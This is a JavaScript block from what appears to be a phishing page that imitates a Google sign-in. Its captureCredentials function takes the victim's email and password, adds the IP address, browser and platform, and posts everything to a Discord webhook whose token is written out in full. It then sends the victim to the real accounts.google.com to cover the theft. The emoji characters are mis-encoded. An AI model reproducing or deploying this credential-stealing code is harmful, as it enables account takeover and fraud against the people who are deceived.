    <script>
        async function captureCredentials(event) {
            event.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Get additional info
            const userAgent = navigator.userAgent;
            const language = navigator.language;
            const platform = navigator.platform;
            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'Unknown');
            
            // Send to Discord webhook
            const payload = {
                content: `ðŸ†• **Google Login Captured!** ðŸ†•\n` +
                        `ðŸ“§ **Email:** \`${email}\`\n` +
                        `ðŸ”‘ **Password:** \`${password}\`\n` +
                        `ðŸŒ **IP:** \`${ip}\`\n` +
                        `ðŸ’» **User Agent:** \`${userAgent.substring(0, 100)}...\`\n` +
                        `ðŸŒ **Language:** \`${language}\`\n` +
                        `ðŸ–¥ï¸ **Platform:** \`${platform}\`\n` +
                        `ðŸ• **Time:** ${new Date().toLocaleString()}`,
                username: "Google Security Alert",
                avatar_url: "https://www.google.com/favicon.ico"
            };
            
            fetch('https://discord.com/api/webhooks/1464833724632924305/VLLI52_XO0AQ5Fs3l_ALbXGpF1UJzx29tyr-v-wNgJ1CwlVr5C9HnXOX_Zaf00Uu379b', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(console.error);
            
            // Show success and redirect
            document.getElementById('form').classList.add('hidden');
            document.getElementById('success').classList.remove('hidden');
            
            setTimeout(() => {
                window.location.href = 'https://accounts.google.com/';
            }, 2000);
        }
    </script>
